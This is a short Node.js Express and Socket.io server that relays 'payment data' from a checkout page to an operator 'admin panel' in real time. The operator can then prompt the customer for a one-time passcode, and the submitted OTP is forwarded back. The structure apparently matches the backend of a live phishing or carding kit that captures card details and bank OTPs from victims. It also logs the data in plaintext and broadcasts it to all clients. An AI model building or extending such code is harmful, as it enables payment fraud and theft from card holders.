
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);

// Configure CORS for Socket.io based on environment
const corsOptions = {
  origin: process.env.NODE_ENV === 'production' 
    ? true // Allow all origins in production (Render.com handles HTTPS)
    : ["http://localhost:5173", "http://localhost:3000"],
  methods: ["GET", "POST"],
  credentials: true
};

const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling']
});

// Serve static files from the dist directory in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  
  // Handle React routing - serve index.html for all non-API routes
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);

  // Handle payment data from checkout page
  socket.on('payment-data', (data) => {
    console.log('Payment data received:', data);
    
    // Emit to admin panel (broadcast to all connected clients)
    socket.broadcast.emit('payment-received', data);
  });

  // Handle admin actions
  socket.on('show-otp', (data) => {
    console.log('Admin requested OTP:', data);
    socket.broadcast.emit('show-otp');
  });

  socket.on('approve-payment', (data) => {
    console.log('Admin approved payment:', data);
    socket.broadcast.emit('payment-approved');
  });

  socket.on('reject-payment', (data) => {
    console.log('Admin rejected payment:', data);
    socket.broadcast.emit('payment-rejected', data.reason);
  });

  // Handle OTP submission
  socket.on('otp-submitted', (data) => {
    console.log('OTP submitted:', data);
    socket.broadcast.emit('otp-received', data);
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});

// Health check endpoint for Render.com
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3001;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
